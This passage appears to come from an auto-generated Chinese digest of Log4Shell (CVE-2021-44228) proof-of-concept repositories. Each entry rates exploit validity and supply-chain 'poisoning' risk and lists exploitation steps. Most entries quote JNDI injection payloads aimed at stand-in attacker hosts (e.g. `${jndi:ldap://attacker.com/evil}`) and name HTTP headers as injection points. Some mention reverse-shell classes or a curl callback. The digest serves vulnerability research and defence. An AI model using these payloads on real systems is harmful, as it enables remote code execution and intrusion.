**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228，又称Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过向Log4j2记录的日志消息中注入恶意的JNDI查找字符串来利用此漏洞。当Log4j2处理包含`\${jndi:}`语法的字符串时，它会尝试通过JNDI（Java Naming and Directory Interface）来解析该字符串。攻击者可以利用这一点，将JNDI指向恶意的LDAP或其他JNDI服务，从而使Log4j2从攻击者控制的服务器上加载并执行任意Java代码，导致远程代码执行(RCE)。

**有效性：**

根据漏洞库信息、搜索结果和提供的POC代码，可以确定该漏洞利用代码是有效的。搜索结果中多个链接（例如NVD, CISA, Unit 42, Cloudflare, Red Hat, Oracle, Microsoft, Sysdig, Picus Security, CrowdStrike）都表明CVE-2021-44228是一个被广泛利用的RCE漏洞。POC代码通过`logger.error("${jndi:ldap://127.0.0.1:1389/any}")`演示了如何触发JNDI查找，如果目标系统存在漏洞，则会尝试连接到指定的LDAP服务器，从而允许远程代码执行。

**投毒风险：**

提供的代码仓库主要包含一个简单的 Maven 项目，包括 `pom.xml` 和 `Main.java` 文件。

*   `pom.xml`: 定义了项目依赖，仅包含 `log4j-core`，版本为 `2.14.1`，这是一个受漏洞影响的版本。
*   `Main.java`: 包含一个简单的 Log4j2 日志记录器，它会记录一条包含 JNDI 注入payload的错误消息。

此仓库的投毒风险较低，约为 5%。主要原因是：

1.  **代码量少且简单**：整个仓库的代码非常少，容易审查。
2.  **目的明确**：代码的目的是为了演示 CVE-2021-44228 漏洞的利用，`Main.java` 中的 payload 清晰可见。
3.  **无恶意行为**：代码本身除了触发 JNDI 查找外，没有其他恶意行为，例如文件操作、网络连接等。

但是，仍然存在极低的风险，比如构建脚本或IDE配置中可能存在隐藏的恶意代码。所以给出5%的风险评估。

**利用方式：**

1.  **攻击者控制日志消息：** 攻击者需要找到一种方法，使包含恶意JNDI查找字符串（例如 `${jndi:ldap://attacker.com/evil}`）的消息被Log4j2记录。
2.  **触发JNDI查找：** 当Log4j2记录包含恶意JNDI查找字符串的消息时，它会尝试通过JNDI连接到攻击者指定的LDAP服务器。
3.  **恶意LDAP服务器：** 攻击者需要设置一个恶意的LDAP服务器，该服务器会返回一个指向恶意Java类的URL。
4.  **远程代码执行：** Log4j2会从URL下载并执行恶意Java类，从而导致远程代码执行。攻击者可以通过这种方式在目标系统上执行任意命令。

**项目地址:** [cuijiung/log4j-CVE-2021-44228](https://github.com/cuijiung/log4j-CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #24

**来源**: [CVE-2021-44228-d4ngkh04w_CVE-2021-44228-Apache-Log4j.md](../2021/CVE-2021-44228-d4ngkh04w_CVE-2021-44228-Apache-Log4j.md)

## CVE-2021-44228-Log4Shell-RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可能导致完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包含安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的Log4j2，且启用了message lookup substitution功能。攻击者能够控制Log4j2记录的日志消息或参数。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的严重远程代码执行漏洞。该漏洞利用了Log4j2的JNDI（Java Naming and Directory Interface）特性，允许攻击者通过控制日志消息或参数，注入恶意的JNDI查找字符串。当Log4j2解析并执行这些字符串时，它会从攻击者控制的LDAP或其他JNDI服务下载并执行任意Java代码，从而实现远程代码执行。 

**有效性：**根据漏洞库信息和搜索结果，此漏洞影响广泛，且存在公开可用的漏洞利用代码，因此该漏洞的利用是有效的。

**投毒风险：**提供的Dockerfile用于构建包含app.jar的镜像。Exploit.java代码尝试建立一个反向shell连接到 `host.docker.internal` 的9000端口。该代码本身并没有发现明显的投毒行为，而是实现了漏洞利用的基本功能，即建立反向shell。`host.docker.internal` 在docker 容器中可以解析为主机的ip地址。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者找到一个应用程序，该程序使用易受攻击版本的Log4j2并记录用户可控的输入。
2.  攻击者将恶意JNDI查找字符串（例如 `${jndi:ldap://attacker.com/Exploit}`）注入到这些输入中。
3.  当Log4j2记录包含恶意字符串的日志消息时，它会尝试解析JNDI查找。
4.  Log4j2连接到攻击者控制的LDAP服务器（或其它JNDI服务）。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的URL。
6.  Log4j2从URL下载并执行恶意Java类，从而实现远程代码执行。例如提供的Exploit.java。
7.  Exploit.java 代码，会尝试创建一个反向shell，连接到攻击者指定的 `host:port` ，从而控制目标系统。

**项目地址:** [d4ngkh04w/CVE-2021-44228-Apache-Log4j](https://github.com/d4ngkh04w/CVE-2021-44228-Apache-Log4j)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #25

**来源**: [CVE-2021-44228-fabioeletto_hka-seminar-log4shell.md](../2021/CVE-2021-44228-fabioeletto_hka-seminar-log4shell.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且启用了 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许攻击者通过 JNDI 注入执行任意代码。漏洞利用方式如下：

1.  **攻击者发送恶意请求：** 攻击者向目标系统发送一个包含特定格式的字符串（例如 `${jndi:ldap://attacker.com/exploit}`）的请求，这个字符串会被 Log4j2 记录。
2.  **Log4j2 解析恶意字符串：** 当 Log4j2 尝试记录包含`${jndi:...}`的字符串时，它会触发 JNDI lookup。
3.  **JNDI 发起 LDAP 查询：** JNDI 会根据 URL (例如 `ldap://attacker.com/exploit`) 发起 LDAP 查询请求攻击者控制的 LDAP 服务器。
4.  **LDAP 服务器返回恶意引用：** 攻击者的 LDAP 服务器返回一个包含恶意 Java 类的引用。
5.  **Log4j2 加载并执行恶意代码：** Log4j2 尝试从指定的 URL 加载并实例化这个 Java 类，从而执行攻击者提供的任意代码。

**有效性：**

根据提供的漏洞信息和搜索结果，该漏洞是真实存在的，并且存在公开可用的 PoC。提供的漏洞利用代码库是一个用于演示 Log4Shell 漏洞的教育项目，因此其有效性是为了演示漏洞而设计的。

**投毒风险：**

评估此代码库的投毒风险较低，约为 10%。

*   代码库的 `README.md` 文件明确声明其目的是为了教育和演示 Log4Shell 漏洞，并警告用户不要在生产环境中使用。
*   代码库结构清晰，主要包含一个易受攻击的 Spring Boot 应用程序 (`vulnerable-app`)，一个模拟恶意 LDAP 服务器的 `marshalsec` fork，和一个提供恶意 Java 类的 HTTP 服务器 (`payload-server`)。
*   虽然存在通过修改 `Exploit.class` 文件来植入恶意代码的可能性，但这种投毒行为相对容易被发现，因为其主要目的是演示漏洞，所以更可能是测试后门连接，并非投毒代码。
*   代码贡献者 Fabio Eletto 已经明确声明了代码的用途，降低了恶意使用的可能性。

但是，用户仍然需要谨慎使用此代码库，务必在隔离的环境中进行测试，并仔细审查代码以确保安全。

**项目地址:** [fabioeletto/hka-seminar-log4shell](https://github.com/fabioeletto/hka-seminar-log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #26

**来源**: [CVE-2021-44228-julian911015_Log4j-Scanner-Exploit.md](../2021/CVE-2021-44228-julian911015_Log4j-Scanner-Exploit.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用了受影响的 Log4j2 版本，且允许 message lookup substitution

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是 Apache Log4j2 中的一个严重漏洞，它允许攻击者通过 JNDI 注入执行远程代码。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 功能，从 LDAP 服务器加载恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，此漏洞是真实且已被广泛利用的。提供的 POC 代码尝试通过构造包含 JNDI 查找的恶意 payload，触发漏洞。

**投毒风险：**
代码主要功能是利用 Log4Shell 漏洞进行扫描和利用。虽然代码本身是为了利用漏洞，但存在一些潜在的风险，可能被恶意修改后进行投毒：

*   **Payload 修改：** 攻击者可以修改 payload，使其执行恶意操作，例如下载并执行其他恶意软件。
*   **LDAP 服务器：** 攻击者可能控制 LDAP 服务器，导致被攻击者下载恶意 payload。
*   **后门植入：** 攻击者可能会在扫描或利用过程中，通过漏洞在目标系统上植入后门，以便长期控制。

综合来看，代码本身具有一定的风险，需要谨慎使用。这里给出10%的投毒风险评估，因为代码的功能和目标较为明确，主要风险在于使用者可能被引导至恶意的LDAP服务器。

**利用方式：**

1.  **构建恶意 Payload：** 攻击者构造包含 JNDI 查找的字符串，例如 `${jndi:ldap://attacker.com/Exploit}`。
2.  **触发日志记录：** 将恶意 payload 注入到应用程序的日志消息中。这可以通过多种方式实现，例如通过 HTTP 请求头（User-Agent、X-Forwarded-For 等）、POST 请求参数或其他任何会被记录到日志中的输入。
3.  **JNDI 查找：** 当 Log4j2 尝试记录包含恶意 payload 的日志消息时，它会触发 JNDI 查找。
4.  **远程代码执行：** JNDI 查找会导致应用程序连接到攻击者控制的 LDAP 服务器，并下载和执行恶意代码。

提供的漏洞利用代码通过以下步骤尝试利用漏洞：

1.  **启动 LDAP 和 HTTP 服务器：** 使用 `JNDIExploit` 工具启动一个恶意的 LDAP 服务器，用于提供恶意 payload。同时启动一个 HTTP 服务器，用于托管 payload 文件。
2.  **扫描目标 URL：** 从指定的 URL 字典中读取 URL，并向这些 URL 发送包含恶意 payload 的 HTTP 请求。
3.  **注入 Payload 到 HTTP 头：** 将 payload 注入到 `X-Api-Version`、`User-Agent` 和 `X-Forwarded-For` 等常见的 HTTP 头中。
4.  **注入 Payload 到 URL 参数：** 将 payload 注入到 URL 参数中。

通过以上步骤，攻击者可以尝试触发目标应用程序的 Log4j2 漏洞，并执行远程代码。

**项目地址:** [julian911015/Log4j-Scanner-Exploit](https://github.com/julian911015/Log4j-Scanner-Exploit)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #27

**来源**: [CVE-2021-44228-khaidtraivch_CVE-2021-44228-Log4Shell-.md](../2021/CVE-2021-44228-khaidtraivch_CVE-2021-44228-Log4Shell-.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，并且允许消息查找替换功能（默认启用）。攻击者需要能够控制 Log4j2 记录的日志消息或参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又称 Log4Shell，是一个存在于 Apache Log4j2 中的远程代码执行漏洞。该漏洞源于 Log4j2 的 JNDI (Java Naming and Directory Interface) 功能，该功能允许在日志消息中执行 JNDI 查找。如果攻击者可以控制日志消息的内容，他们就可以注入恶意的 JNDI 查找字符串，从而导致 Log4j2 从攻击者控制的 LDAP 或其他 JNDI 服务加载并执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，CVE-2021-44228 是一个被广泛利用的严重漏洞。 搜索结果中提供了多个关于漏洞分析、缓解措施和利用的链接。虽然提供的漏洞利用代码仓库只包含一个 README.md 文件，信息很少。但考虑到CVE本身的严重性和公开性，判断存在有效的PoC。

**投毒风险：**
提供的漏洞利用代码仓库 `/tmp/b3e5418f03d45523b0a6001074bd0614/README.md` 只包含简单的描述信息 "CVE-2021-44228-Log4Shell-Kiểm thử xâm nhập" (越南语，意思是渗透测试)。**无法直接从该文件判断是否存在投毒代码。** 但从代码仓库的简洁程度来看，作者可能意图引导用户从其他渠道获取EXP，增加了恶意代码嵌入的可能性，**因此存在一定的投毒风险。风险评估为10%**。

**利用方式：**
漏洞利用的核心在于构造包含恶意 JNDI 查找的日志消息，例如：`${jndi:ldap://attacker.com/evil}`。当 Log4j2 记录包含此字符串的消息时，它会尝试连接到 `attacker.com` 上的 LDAP 服务器，并加载和执行从该服务器返回的 Java 代码。

**攻击步骤：**
1.  攻击者找到一个使用 Log4j2 的应用程序，该应用程序会将攻击者可控的数据记录到日志中。
2.  攻击者将包含恶意 JNDI 查找字符串的payload注入到应用程序的输入字段，例如 HTTP Header (User-Agent, X-Forwarded-For等等)、POST 参数、GET 参数或其他任何会被记录到日志中的数据。
3.  当应用程序记录包含该字符串的日志消息时，Log4j2 会尝试执行 JNDI 查找。
4.  如果应用程序配置允许，Log4j2 将连接到攻击者控制的 JNDI 服务器（例如 LDAP），并下载和执行恶意 Java 代码。

**缓解措施：**
*   升级 Log4j2 到 2.17.1 或更高版本。
*   如果无法升级，可以设置系统属性 `log4j2.formatMsgNoLookups=true` 或环境变量 `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`，以禁用消息查找替换功能。
*   删除 `JndiLookup` 类。

**项目地址:** [khaidtraivch/CVE-2021-44228-Log4Shell-](https://github.com/khaidtraivch/CVE-2021-44228-Log4Shell-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #28

**来源**: [CVE-2021-44228-mgueye3_Log4Shell.md](../2021/CVE-2021-44228-mgueye3_Log4Shell.md)

## CVE-2021-44228-Apache Log4j2-JNDI 注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI 注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228 (Log4Shell) 漏洞存在于 Apache Log4j2 中，由于其 JNDI 功能未对攻击者控制的 LDAP 和其他 JNDI 相关端点进行保护。攻击者可以控制日志消息或日志消息参数，从而在启用消息查找替换时执行从 LDAP 服务器加载的任意代码。

**有效性：**
根据漏洞库信息和大量已公开的漏洞利用案例，此漏洞的利用是有效的。大量资料表明，该漏洞在野外被广泛利用。

**投毒风险：**
提供的漏洞利用代码是一个JSON文件，其中包含一组flag，这些flag很可能是CTF挑战或者渗透测试演练中的结果，而不是实际的漏洞利用代码。因此，可以认为不存在投毒代码。

**利用方式：**
1.  攻击者构造包含 JNDI 查找表达式的恶意字符串，例如 `${jndi:ldap://attacker.com/evil}`。
2.  目标应用程序使用存在漏洞的 Log4j2 版本记录此字符串。
3.  Log4j2 尝试解析 JNDI 查找表达式，并连接到攻击者控制的 LDAP 服务器（或 RMI、DNS 等）。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

需要注意的是，从 Log4j 2.15.0 开始，此行为已默认禁用。在 2.16.0 版本（以及 2.12.2、2.12.3 和 2.3.1）中，此功能已完全删除。


**项目地址:** [mgueye3/Log4Shell](https://github.com/mgueye3/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #29

**来源**: [CVE-2021-44228-michaelsanford_Log4Shell-Honeypot.md](../2021/CVE-2021-44228-michaelsanford_Log4Shell-Honeypot.md)

## CVE-2021-44228-Log4Shell-Honeypot

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和数据泄露

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用存在漏洞的Log4j2版本，且允许log message lookup substitution

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一种严重的远程代码执行 (RCE) 漏洞，存在于 Apache Log4j 2.0-beta9 到 2.15.0 版本（不包括安全版本 2.12.2、2.12.3 和 2.3.1）中。该漏洞源于 Log4j2 JNDI 功能在配置、日志消息和参数中，未能充分保护免受攻击者控制的 LDAP 和其他 JNDI 相关端点的攻击。

**利用方式：**

攻击者可以控制日志消息或日志消息参数，从而执行从 LDAP 服务器加载的任意代码。这是通过在日志消息中插入包含 JNDI 查找的恶意字符串来实现的，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 处理此日志消息时，它会尝试连接到攻击者控制的 LDAP 服务器，并执行服务器返回的恶意代码。

**有效性：**

根据漏洞库信息、搜索结果以及漏洞利用代码，可以判断该漏洞利用的POC代码有效。网上存在大量的利用该漏洞的POC，并且该漏洞已被广泛利用。

**投毒风险：**

提供的代码是Log4Shell Honeypot，目的是为了检测和防御Log4Shell攻击，而不是利用Log4Shell进行攻击。Dockerfile 构建了一个 Python 应用，用于模拟易受攻击的 Log4j2 环境，通过检测特定模式（例如 `${jndi:`）来识别潜在的攻击。主要目的是捕获攻击尝试的相关信息，例如攻击来源 IP 地址、攻击载荷等。尽管从技术角度讲，可以修改该 Honeypot 以包含恶意代码，但从代码的主要功能来看，其目的在于防御，而不是攻击。虽然整体投毒风险较低，但如果有人修改了 Honeypot 的代码，增加了反向shell或者其他恶意代码，那么投毒风险会增加。因此，给出10%的投毒风险评估。

总而言之，这是一个高危漏洞，攻击者可以利用它来远程执行代码。但是，提供的代码是一个honeypot，旨在检测此类攻击，虽然存在被修改后用作恶意用途的可能，但是可能性相对较低。

**项目地址:** [michaelsanford/Log4Shell-Honeypot](https://github.com/michaelsanford/Log4Shell-Honeypot)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #30

**来源**: [CVE-2021-44228-moften_Log4Shell.md](../2021/CVE-2021-44228-moften_Log4Shell.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包含安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响的Log4j2版本，并且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个关键的远程代码执行漏洞，存在于 Apache Log4j 2.0-beta9 到 2.15.0 版本中 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)。此漏洞源于 Log4j2 JNDI 功能在配置、日志消息和参数中，未能防止攻击者控制的 LDAP 和其他 JNDI 相关端点。 攻击者可以通过控制日志消息或日志消息参数，在启用消息查找替换时，执行从 LDAP 服务器加载的任意代码。

**有效性：**
根据漏洞描述和提供的PoC代码，该漏洞的利用是有效的。PoC 通过 JNDI 注入 LDAP URL 来触发漏洞，从而导致远程代码执行。

**投毒风险：**
该仓库的投毒风险评估为10%。虽然PoC本身旨在演示漏洞利用，但 `Exploit.java` 包含执行 `curl http://TU_IP:9999/pwned` 的指令，表明攻击者可以轻易地替换成更具破坏性的命令。`main.py`脚本本身看起来没有明显的恶意代码，但如果攻击者修改`Exploit.java` 并诱导用户使用，则存在风险。 README中包含了从github上克隆`marshalsec`的步骤，如果`marshalsec`库被投毒，也会导致风险。因此，需要仔细审查和验证。

**利用方式：**
1.  **确定目标：** 找到使用易受攻击的 Log4j2 版本的应用程序。
2.  **构造Payload：** 构造包含 JNDI 查找的恶意字符串。例如： `${jndi:ldap://attacker.com/Exploit}`。
3.  **触发日志记录：** 将 Payload 注入到应用程序将会记录的输入字段中，例如 HTTP Headers (User-Agent, Referer, X-Forwarded-For), POST 参数等。
4.  **恶意LDAP服务器：**设置一个恶意的LDAP服务器，当Log4j2尝试去lookup这个URL的时候，从HTTP服务器上获取恶意的Java Class文件并执行。
5.  **远程代码执行：** Log4j2 将连接到攻击者的 LDAP 服务器，检索并执行恶意 Java 代码，从而允许攻击者在目标系统上执行任意命令。

请注意，成功利用此漏洞需要目标应用程序启用消息查找替换，并且能够解析 JNDI 查找。较高版本的 Log4j 默认禁用了此功能，从而缓解了此漏洞。

**项目地址:** [moften/Log4Shell](https://github.com/moften/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #31

**来源**: [CVE-2021-44228-mr-won_Log4shell.md](../2021/CVE-2021-44228-mr-won_Log4shell.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 🔥 치명적 (CVSS 10.0) - 远程代码执行，完全控制受影响系统

**影响版本:** 2.0-beta9 ~ 2.14.1

**利用条件:** 目标系统使用了存在漏洞的Log4j2版本，且允许Log4j2记录攻击者可控的输入（例如，HTTP请求头、用户输入等），消息lookup substitution is enabled

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的远程代码执行漏洞。攻击者通过将恶意的JNDI lookup字符串（例如 `${jndi:ldap://attacker.com:1389/exploit}`）注入到Log4j2可以记录的任何输入中，即可触发该漏洞。

**有效性：**

提供的漏洞利用代码包含一个README.md文件，该文件描述了Log4Shell漏洞的原理、影响、利用方式、检测和缓解措施。其中包含一个利用示例 `${jndi:ldap://attacker.com:1389/exploit}`，表明该POC有效，可用于触发漏洞。

**利用方式：**

1.  攻击者构造包含恶意JNDI lookup字符串的Payload，例如 `${jndi:ldap://attacker.com:1389/exploit}`。
2.  攻击者将该Payload注入到应用程序可以记录的任何输入点，例如HTTP请求头（User-Agent，X-Forwarded-For等）、POST请求参数、Web表单字段等。
3.  应用程序使用Log4j2记录包含该Payload的日志条目。
4.  Log4j2在处理日志条目时，解析JNDI lookup字符串，并尝试连接到攻击者控制的LDAP服务器 `attacker.com:1389`。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的URL。
6.  Log4j2下载并执行该恶意Java类，导致远程代码执行。

**投毒风险：**
该README.md 文件分析报告本身不包含恶意代码，但存在潜在的投毒风险，该风险主要来自用户在使用git clone 下载源码时，如果攻击者控制了welk仓库,或者使用docker build 从Dockerfile构建docker镜像时，攻击者可以在Dockerfile中植入恶意代码。因此，代码仓库或镜像来源不可信的情况下，可能存在潜在的风险。因此该仓库中存在投毒代码的可能性较低，但不能完全排除(10%).

**项目地址:** [mr-won/Log4shell](https://github.com/mr-won/Log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #32

**来源**: [CVE-2021-44228-qw3rtyou_CVE-2021-44228_dockernize.md](../2021/CVE-2021-44228-qw3rtyou_CVE-2021-44228_dockernize.md)

## CVE-2021-44228 (Log4Shell)

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，并且启用了消息查找替换功能。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个严重的远程代码执行漏洞，存在于Apache Log4j2中。该漏洞源于Log4j2在配置、日志消息和参数中使用的JNDI功能没有对攻击者控制的LDAP和其他JNDI相关端点提供足够的保护。

**有效性：**

提供的POC代码有效。它设置了一个dockerized环境，包括一个易受攻击的Java应用程序和一个模拟攻击者的LDAP服务器和HTTP服务器。该POC演示了如何通过JNDI注入执行任意代码。

**投毒风险：**

评估该代码的投毒风险约为10%。主要考虑以下几点：

*   `attacker/Payload.java`: 包含反弹shell的代码，存在被恶意修改的可能。
*   `attacker/index.js`和`attacker/ldap-server.js`:  可能被修改为重定向或记录漏洞利用尝试，虽然不直接执行恶意代码，但可以收集信息。
*   虽然大部分代码的功能是明确的，但在`Payload.java`中嵌入更隐蔽的后门或数据收集行为是可能的。因此存在一定的投毒风险。

**利用方式：**

1.  攻击者向目标应用程序发送包含恶意JNDI查找字符串的请求。例如：`${jndi:ldap://attacker.com/Exploit}`。
2.  如果目标应用程序使用Log4j2记录该请求，它会尝试解析JNDI查找字符串。
3.  Log4j2通过JNDI连接到攻击者控制的LDAP服务器 (attacker.com)。
4.  LDAP服务器返回一个包含指向攻击者控制的HTTP服务器的Java类的引用。
5.  Log4j2从HTTP服务器下载并执行该Java类，从而允许攻击者在目标系统上执行任意代码。

**缓解措施：**

*   升级到Log4j 2.17.1 或更高版本（此版本完全移除了有问题的 JNDI 功能）。
*   在旧版本中，设置`log4j2.formatMsgNoLookups=true` 或移除`JndiLookup` 类。

**项目地址:** [qw3rtyou/CVE-2021-44228_dockernize](https://github.com/qw3rtyou/CVE-2021-44228_dockernize)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #33

**来源**: [CVE-2021-44228-redhuntlabs_Log4JHunt.md](../2021/CVE-2021-44228-redhuntlabs_Log4JHunt.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且允许 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的高危远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 注入，从 LDAP 服务器加载并执行任意代码。  

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码（Log4JHunt），该漏洞是有效的，并且在野外被广泛利用。Log4JHunt工具旨在自动化检测Log4Shell漏洞。

**投毒风险：**  提供的漏洞利用代码仓库 (Log4JHunt) 主要是一个扫描器，用于检测 Log4Shell 漏洞。通过人工分析代码，发现代码本身存在后门的概率较低。但用户使用第三方工具，仍然存在一定的风险。

仓库中可能存在的潜在风险点：

*   **依赖风险:** 该工具依赖于第三方库，这些库可能存在未知的漏洞或被恶意篡改。但这种风险是普遍存在的，并非该仓库特有。
*   **配置错误风险:** 用户可能配置不当，例如将扫描结果泄露到公共渠道，或者使用弱口令的 DNS callback server，导致信息泄露或被恶意利用。
*   **恶意作者风险：** 作者可能在未来的版本中植入恶意代码，但目前没有证据表明存在这种情况。

综合考虑，此仓库的投毒风险较低，大约为10%。

**利用方式：**

1.  攻击者向目标系统发送包含恶意 JNDI 查找字符串的请求。例如：`${jndi:ldap://attacker.com/evil}`。
2.  如果目标系统使用受影响的 Log4j2 版本记录该请求，Log4j2 会尝试解析 JNDI 查找字符串。
3.  Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 (attacker.com)。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，导致远程代码执行。

**Log4JHunt 工具的使用方式：**

1.  使用 Log4JHunt 扫描目标系统，可以指定单个 URL 或包含 URL 列表的文件。
2.  Log4JHunt 会向目标系统发送包含恶意 JNDI 查找字符串的请求，并监控 DNS callback server 或 Canarytokens 服务，以判断目标系统是否存在漏洞。
3.  如果目标系统存在漏洞，Log4JHunt 会收到 DNS callback 或 Canarytokens 触发的通知。

**项目地址:** [redhuntlabs/Log4JHunt](https://github.com/redhuntlabs/Log4JHunt)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #34

**来源**: [CVE-2021-44228-safeer-accuknox_log4j-shell-poc.md](../2021/CVE-2021-44228-safeer-accuknox_log4j-shell-poc.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 to 2.15.0 (不包含 security releases 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标应用使用了存在漏洞的Log4j2版本，并且启用了message lookup substitution功能，攻击者能够控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j 2中的高危远程代码执行漏洞。该漏洞源于Log4j2的JNDI功能，当message lookup substitution功能启用时，攻击者可以通过控制日志消息或日志消息参数，利用JNDI注入，从恶意的LDAP服务器加载并执行任意代码。

**POC有效性：**

根据提供的docker-compose.yaml文件和Dockerfile文件，该POC的目的是创建一个易受攻击的Log4j2 Web应用程序和一个攻击服务器。attack-server 搭建了一个恶意的JNDI服务，用于向目标应用返回恶意payload，实现远程代码执行。

vulnerable-application 使用了tomcat 镜像，部署了 log4shell.war 包，模拟存在漏洞的web应用。

所以POC代码是有效的。

**投毒风险：**

